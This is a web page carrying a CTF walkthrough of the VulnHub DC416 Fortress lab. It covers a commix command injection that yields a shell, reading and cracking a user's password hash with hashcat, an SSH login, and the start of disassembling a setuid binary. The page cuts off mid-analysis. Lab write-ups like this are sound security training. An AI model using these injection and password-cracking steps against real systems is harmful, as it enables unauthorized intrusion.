<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>VulnHub: Parse the shortest quest DC416 Fortress</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Continuing CTF analysis from DefCon Toronto's conference. The tasks are provided by the VulnHub team, for which many thanks to them. At this time, we ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>VulnHub: Parse the shortest quest DC416 Fortress</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/126/e0c/e64/126e0ce643954a228e33125f6120f252.png"><br><br>  Continuing CTF analysis from <a href="https://dc416.com/">DefCon Toronto's</a> conference.  The tasks are provided by the <a href="https://www.vulnhub.com/">VulnHub</a> team, for which <a href="https://www.vulnhub.com/">many</a> thanks to them.  At this time, we will focus on a small <a href="https://www.vulnhub.com/entry/dc416-2016,168/">DC416 Fortress</a> , there are only 3 flags.  So it will not be difficult. <br><br>  Below, you can see the previous parsing: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  <a href="https://habrahabr.ru/post/318372/">DC416 Dick Dastardly</a> </li><li>  <a href="https://habrahabr.ru/post/318998/">DC416 Basement</a> </li></ul><a name="habracut"></a><br><h3>  Let's start </h3><br>  As usual, after starting the virtual machine, we look at the open ports: <br><br><pre><code class="bash hljs">$ sudo arp-scan -l -I wlan0 | grep <span class="hljs-string"><span class="hljs-string">"CADMUS COMPUTER SYSTEMS"</span></span> | awk <span class="hljs-string"><span class="hljs-string">'{print $1}'</span></span> | xargs sudo nmap -sV -p1-65535</code> </pre> <br><blockquote>  Starting Nmap 7.01 ( <a href="https://nmap.org/">nmap.org</a> ) at 2017-01-09 23:55 MSK <br>  Nmap scan report for 192.168.1.192 <br>  Host is up (0.00032s latency). <br>  PORT STATE SERVICE VERSION <br>  22 / tcp open ssh OpenSSH 7.2 (FreeBSD 20160310; protocol 2.0) <br>  80 / tcp open http Apache httpd 2.4.23 ((FreeBSD) OpenSSL / 1.0.2j-freebsd PHP / 5.6.27) <br>  443 / tcp open ssl / http Apache httpd 2.4.23 ((FreeBSD) OpenSSL / 1.0.2j-freebsd PHP / 5.6.27) <br>  MAC Address: 08: 00: 27: 0E: F4: C6 (Oracle VirtualBox virtual NIC) <br>  Service Info: OS: FreeBSD;  CPE: cpe: / o: freebsd: freebsd </blockquote><br><h3>  Flag 1 </h3><br>  <i>Dirsearch</i> found 1 single script, which is not surprising: <br><br><pre> <code class="bash hljs">$ sudo dirsearch -u <span class="hljs-string"><span class="hljs-string">'https://192.168.1.192'</span></span> -e php,bak,html,txt,jpg -w /usr/share/dirb/wordlists/big.txt -r -f -x 403</code> </pre> <br><img src="https://habrastorage.org/files/d84/3ff/ed6/d843ffed6ae54d57aa94da7e2a669172.png"><br><br>  Go to it, and see the form for entering the IP address, and the result of the scan <i>nmap</i> 'om: <br><br><img src="https://habrastorage.org/files/c04/be6/6bd/c04be66bd58c49778106df20d7ce9832.png"><br><br>  Feed this form of <a href="https://github.com/commixproject/commix">Commix</a> , and see what it finds: <br><br><pre> <code class="bash hljs">$ commix -u <span class="hljs-string"><span class="hljs-string">'https://192.168.1.192/scanner.php'</span></span> --data=<span class="hljs-string"><span class="hljs-string">'host=127.0.0.1'</span></span></code> </pre> <br><img src="https://habrastorage.org/files/207/88b/e83/20788be831624827bfcf176f2cddb126.png"><br><br>  The injection is successful, <i>commix has</i> kindly provided us with a shell.  Looking around in the system we notice a couple of suspicious directories, in one of which the flag lies: <br><blockquote><pre> <code class="bash hljs">commix(os_shell) &gt; ls</code> </pre> <br>  index.html k1ngd0m_k3yz logo.png s1kr3t scanner.php styles.css <br><br><pre> <code class="bash hljs">commix(os_shell) &gt; file s1kr3t</code> </pre> <br>  s1kr3t: directory <br><br><pre> <code class="bash hljs">commix(os_shell) &gt; ls s1kr3t</code> </pre> <br>  flag.txt <br><br><pre> <code class="bash hljs">commix(os_shell) &gt; cat s1kr3t/flag.txt</code> </pre> <br>  <i>FLAG {n0_one_br3aches_teh_f0rt}</i> </blockquote><br><h3>  Flag 2 </h3><br>  In the second directory we have a password hash user <i>craven</i> : <br><blockquote><pre> <code class="bash hljs">commix(os_shell) &gt; ls k1ngd0m_k3yz</code> </pre> <br>  master passwd <br><br><pre> <code class="bash hljs">commix(os_shell) &gt; cat k1ngd0m_k3yz/master</code> </pre> <br>  craven: <b>$ 6 $ qAgPM2TEordSoFnH $ 4uPUAhB.9rORkWExA8jI0Sbwn0Bj50KAK0tJ4rkrUrIkP6v.gE / 6Fw9 / yn1Ejl2TedyN5ziUz8N0unsHocuks.</b>  : 1002: 1002 :: 0: 0: User &amp;: / home / craven: / bin / sh <br><br><pre> <code class="bash hljs">commix(os_shell) &gt; cat k1ngd0m_k3yz/passwd</code> </pre> <br>  craven: *: 1002: 1002: User &amp;: / home / craven: / bin / sh </blockquote><br>  We have a password hash.  After examining the user's home directory, we find there a hint to his recovery: <br><blockquote><pre> <code class="bash hljs">commix(os_shell) &gt; ls -l /usr/home/craven</code> </pre> <br>  total 24 <br>  -r -------- 1 craven craven 46 Nov 6 01:30 flag.txt <br>  -rw-r - r-- 1 craven craven 119 Nov 5 02:23 hint.txt <br>  -rw-r - r-- 1 craven craven 77 Nov 5 02:20 reminders.txt <br><br><pre> <code class="bash hljs">commix(os_shell) &gt; cat /home/craven/hint.txt</code> </pre> <br>  Keep forgetting my password so I made myself a hint.  Password is a digits followed by my pet's name and a symbol. <br><br><pre> <code class="bash hljs">commix(os_shell) &gt; cat /home/craven/reminders.txt</code> </pre> <br>  To buy: index.html k1ngd0m_k3yz logo.png s1kr3t scanner.php styles.css skim milk index.html k1ngd0m_k3yz logo.png s1kr3t scanner.php styles.css organic free-run .css dog bone for qwerty index.html k1ngd0m_k3yz logo.png s1kr3t scanner.php styles.css sriracha </blockquote><br>  Removing the garbage we get the line: <br><blockquote>  To buy: skim milk organic free-run eggs bone for qwerty sriracha </blockquote><br>  We know the name of the dog, the case for small.  Starting <i>john</i> or <i>hashcat</i> , reset the password: <br><pre> <code class="bash hljs">$ sudo /opt/cudaHashcat/cudaHashcat32.bin -m 1800 -a 3 hash.txt ?d?d?dqwerty?s</code> </pre> <br><blockquote>  $ 6 $ qAgPM2TEordSoFnH $ 4uPUAhB.9rORkWExA8jI0Sbwn0Bj50KAK0tJ4rkrUrIkP6v.gE / 6Fw9 / yn1Ejl2TedyN5ziUz8N0unsHocuks .: <b>931qwerty</b> </blockquote><br>  Ok, log in via ssh and pick up the second flag: <br><br><pre> <code class="bash hljs">$ ssh craven@192.168.1.192</code> </pre> <br><pre> <code class="bash hljs">$ <span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> /usr/home/craven $ id uid=1002(craven) gid=1002(craven) groups=1002(craven) $ cat flag.txt FLAG{w0uld_u_lik3_som3_b33r_with_ur_r3d_PiLL}</code> </pre> <br><h3>  Flag 3 </h3><br>  In the home directory of the user <i>craven</i> , for some reason, left a file with the initialization settings <i>gdb</i> : <br><br><pre> <code class="bash hljs">$ ls -ahl ... -rw-r--r-- 1 craven craven 60B Nov 7 20:36 .gdbinit</code> </pre> <br>  With rather interesting content: <br><br><pre> <code class="bash hljs">$ cat .gdbinit <span class="hljs-built_in"><span class="hljs-built_in">source</span></span> /usr/<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/share/peda/peda.py br *0x0000000000400904</code> </pre> <br>  Pleasant surprise, ready breakpoint and <i>peda</i> .  However, not everything is so simple, it turned out that the <i>ped</i> was still removed before us ... After a brief search, we find our debugging victim: <br><br><pre> <code class="bash hljs">$ ls -ahl /home/vulnhub/ -r-------- 1 vulnhub vulnhub 26B Nov 8 20:08 flag.txt -rwsr-xr-x 1 vulnhub vulnhub 8.8K Nov 8 20:15 reader</code> </pre> <br>  The file is small, and apparently it will allow to get the last flag.  Let's see what's inside: <br><br><pre> <code class="bash hljs">$ gdb /home/vulnhub/reader</code> </pre> <br><div class="spoiler">  <b class="spoiler_title">Main function</b> <div class="spoiler_text">  (gdb) disassemble main <br><br><pre> <code class="hljs mel">Dump of assembler code <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> function main: <span class="hljs-number"><span class="hljs-number">0x00000000004009a0</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">0</span></span>&gt;: push %rbp <span class="hljs-number"><span class="hljs-number">0x00000000004009a1</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">1</span></span>&gt;: mov %rsp,%rbp <span class="hljs-number"><span class="hljs-number">0x00000000004009a4</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">4</span></span>&gt;: sub $0x150,%rsp <span class="hljs-number"><span class="hljs-number">0x00000000004009ab</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">11</span></span>&gt;: movl $0x0,<span class="hljs-number"><span class="hljs-number">-0x4</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x00000000004009b2</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">18</span></span>&gt;: mov %edi,<span class="hljs-number"><span class="hljs-number">-0x8</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x00000000004009b5</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">21</span></span>&gt;: mov %rsi,<span class="hljs-number"><span class="hljs-number">-0x10</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x00000000004009b9</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">25</span></span>&gt;: mov %rdx,<span class="hljs-number"><span class="hljs-number">-0x18</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x00000000004009bd</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">29</span></span>&gt;: cmpl $0x1,<span class="hljs-number"><span class="hljs-number">-0x8</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x00000000004009c1</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">33</span></span>&gt;: jne <span class="hljs-number"><span class="hljs-number">0x4009ef</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">79</span></span>&gt; <span class="hljs-number"><span class="hljs-number">0x00000000004009c7</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">39</span></span>&gt;: mov $0x400bd6,%rdi <span class="hljs-number"><span class="hljs-number">0x00000000004009d1</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">49</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">-0x10</span></span>(%rbp),%rax <span class="hljs-number"><span class="hljs-number">0x00000000004009d5</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">53</span></span>&gt;: mov (%rax),%rsi <span class="hljs-number"><span class="hljs-number">0x00000000004009d8</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">56</span></span>&gt;: mov $0x0,%al <span class="hljs-number"><span class="hljs-number">0x00000000004009da</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">58</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40067c</span></span> &lt;printf@plt&gt; <span class="hljs-number"><span class="hljs-number">0x00000000004009df</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">63</span></span>&gt;: mov $0x1,%edi <span class="hljs-number"><span class="hljs-number">0x00000000004009e4</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">68</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x114</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x00000000004009ea</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">74</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40070c</span></span> &lt;exit@plt&gt; <span class="hljs-number"><span class="hljs-number">0x00000000004009ef</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">79</span></span>&gt;: lea <span class="hljs-number"><span class="hljs-number">-0x108</span></span>(%rbp),%rsi <span class="hljs-number"><span class="hljs-number">0x00000000004009f6</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">86</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">-0x10</span></span>(%rbp),%rax <span class="hljs-number"><span class="hljs-number">0x00000000004009fa</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">90</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">0x8</span></span>(%rax),%rdi <span class="hljs-number"><span class="hljs-number">0x00000000004009fe</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">94</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x4006cc</span></span> &lt;lstat@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400a03</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">99</span></span>&gt;: cmp $0x0,%eax <span class="hljs-number"><span class="hljs-number">0x0000000000400a06</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">102</span></span>&gt;: jge <span class="hljs-number"><span class="hljs-number">0x400a18</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">120</span></span>&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400a0c</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">108</span></span>&gt;: movl $0x1,<span class="hljs-number"><span class="hljs-number">-0x4</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400a13</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">115</span></span>&gt;: jmpq <span class="hljs-number"><span class="hljs-number">0x400b84</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">484</span></span>&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400a18</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">120</span></span>&gt;: mov $0x400be9,%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400a22</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">130</span></span>&gt;: mov $0x0,%al <span class="hljs-number"><span class="hljs-number">0x0000000000400a24</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">132</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40067c</span></span> &lt;printf@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400a29</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">137</span></span>&gt;: mov $0x1,%edi <span class="hljs-number"><span class="hljs-number">0x0000000000400a2e</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">142</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x118</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400a34</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">148</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x4006dc</span></span> &lt;sleep@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400a39</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">153</span></span>&gt;: movzwl <span class="hljs-number"><span class="hljs-number">-0x100</span></span>(%rbp),%edi <span class="hljs-number"><span class="hljs-number">0x0000000000400a40</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">160</span></span>&gt;: and $0xf000,%edi <span class="hljs-number"><span class="hljs-number">0x0000000000400a46</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">166</span></span>&gt;: cmp $0xa000,%edi <span class="hljs-number"><span class="hljs-number">0x0000000000400a4c</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">172</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x11c</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400a52</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">178</span></span>&gt;: jne <span class="hljs-number"><span class="hljs-number">0x400a7b</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">219</span></span>&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400a58</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">184</span></span>&gt;: mov $0x400c00,%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400a62</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">194</span></span>&gt;: mov $0x0,%al <span class="hljs-number"><span class="hljs-number">0x0000000000400a64</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">196</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40067c</span></span> &lt;printf@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400a69</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">201</span></span>&gt;: movl $0x0,<span class="hljs-number"><span class="hljs-number">-0x4</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400a70</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">208</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x120</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400a76</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">214</span></span>&gt;: jmpq <span class="hljs-number"><span class="hljs-number">0x400b84</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">484</span></span>&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400a7b</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">219</span></span>&gt;: mov $0x400c1d,%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400a85</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">229</span></span>&gt;: mov $0x0,%al <span class="hljs-number"><span class="hljs-number">0x0000000000400a87</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">231</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40067c</span></span> &lt;printf@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400a8c</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">236</span></span>&gt;: mov $0x400c37,%rsi <span class="hljs-number"><span class="hljs-number">0x0000000000400a96</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">246</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">-0x10</span></span>(%rbp),%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400a9a</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">250</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">0x8</span></span>(%rdi),%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400a9e</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">254</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x124</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400aa4</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">260</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x4006ec</span></span> &lt;strstr@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400aa9</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">265</span></span>&gt;: cmp $0x0,%rax <span class="hljs-number"><span class="hljs-number">0x0000000000400aad</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">269</span></span>&gt;: je <span class="hljs-number"><span class="hljs-number">0x400ad6</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">310</span></span>&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400ab3</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">275</span></span>&gt;: mov $0x400c3c,%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400abd</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">285</span></span>&gt;: mov $0x0,%al <span class="hljs-number"><span class="hljs-number">0x0000000000400abf</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">287</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40067c</span></span> &lt;printf@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400ac4</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">292</span></span>&gt;: movl $0xffffffff,<span class="hljs-number"><span class="hljs-number">-0x4</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400acb</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">299</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x128</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400ad1</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">305</span></span>&gt;: jmpq <span class="hljs-number"><span class="hljs-number">0x400b84</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">484</span></span>&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400ad6</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">310</span></span>&gt;: mov $0x400c60,%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400ae0</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">320</span></span>&gt;: mov $0x0,%al <span class="hljs-number"><span class="hljs-number">0x0000000000400ae2</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">322</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40067c</span></span> &lt;printf@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400ae7</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">327</span></span>&gt;: mov $0x400c82,%rsi <span class="hljs-number"><span class="hljs-number">0x0000000000400af1</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">337</span></span>&gt;: xor %ecx,%ecx <span class="hljs-number"><span class="hljs-number">0x0000000000400af3</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">339</span></span>&gt;: mov $0x64,%edx <span class="hljs-number"><span class="hljs-number">0x0000000000400af8</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">344</span></span>&gt;: lea <span class="hljs-number"><span class="hljs-number">-0x90</span></span>(%rbp),%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400aff</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">351</span></span>&gt;: mov %rsi,<span class="hljs-number"><span class="hljs-number">-0x130</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400b06</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">358</span></span>&gt;: mov %ecx,%esi <span class="hljs-number"><span class="hljs-number">0x0000000000400b08</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">360</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x134</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400b0e</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">366</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x4006fc</span></span> &lt;memset@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400b13</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">371</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">-0x10</span></span>(%rbp),%rdx <span class="hljs-number"><span class="hljs-number">0x0000000000400b17</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">375</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">0x8</span></span>(%rdx),%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400b1b</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">379</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">-0x130</span></span>(%rbp),%rsi <span class="hljs-number"><span class="hljs-number">0x0000000000400b22</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">386</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40071c</span></span> &lt;<span class="hljs-keyword"><span class="hljs-keyword">fopen</span></span>@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400b27</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">391</span></span>&gt;: mov $0x64,%esi <span class="hljs-number"><span class="hljs-number">0x0000000000400b2c</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">396</span></span>&gt;: lea <span class="hljs-number"><span class="hljs-number">-0x90</span></span>(%rbp),%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400b33</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">403</span></span>&gt;: mov %rax,<span class="hljs-number"><span class="hljs-number">-0x20</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400b37</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">407</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">-0x20</span></span>(%rbp),%rdx <span class="hljs-number"><span class="hljs-number">0x0000000000400b3b</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">411</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40068c</span></span> &lt;fgets@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400b40</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">416</span></span>&gt;: mov $0x400c84,%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400b4a</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">426</span></span>&gt;: mov %rax,<span class="hljs-number"><span class="hljs-number">-0x140</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400b51</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">433</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40072c</span></span> &lt;puts@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400b56</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">438</span></span>&gt;: lea <span class="hljs-number"><span class="hljs-number">-0x90</span></span>(%rbp),%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400b5d</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">445</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x144</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400b63</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">451</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x40072c</span></span> &lt;puts@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400b68</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">456</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">-0x20</span></span>(%rbp),%rdi <span class="hljs-number"><span class="hljs-number">0x0000000000400b6c</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">460</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x148</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400b72</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">466</span></span>&gt;: callq <span class="hljs-number"><span class="hljs-number">0x4006bc</span></span> &lt;<span class="hljs-keyword"><span class="hljs-keyword">fclose</span></span>@plt&gt; <span class="hljs-number"><span class="hljs-number">0x0000000000400b77</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">471</span></span>&gt;: movl $0x0,<span class="hljs-number"><span class="hljs-number">-0x4</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400b7e</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">478</span></span>&gt;: mov %eax,<span class="hljs-number"><span class="hljs-number">-0x14c</span></span>(%rbp) <span class="hljs-number"><span class="hljs-number">0x0000000000400b84</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">484</span></span>&gt;: mov <span class="hljs-number"><span class="hljs-number">-0x4</span></span>(%rbp),%eax <span class="hljs-number"><span class="hljs-number">0x0000000000400b87</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">487</span></span>&gt;: add $0x150,%rsp <span class="hljs-number"><span class="hljs-number">0x0000000000400b8e</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">494</span></span>&gt;: pop %rbp <span class="hljs-number"><span class="hljs-number">0x0000000000400b8f</span></span> &lt;main+<span class="hljs-number"><span class="hljs-number">495</span></span>&gt;: retq</code> </pre> <br>  End of assembler dump. <br></div></div><br>  Let us analyze what is happening here: <br><br><ul><li>  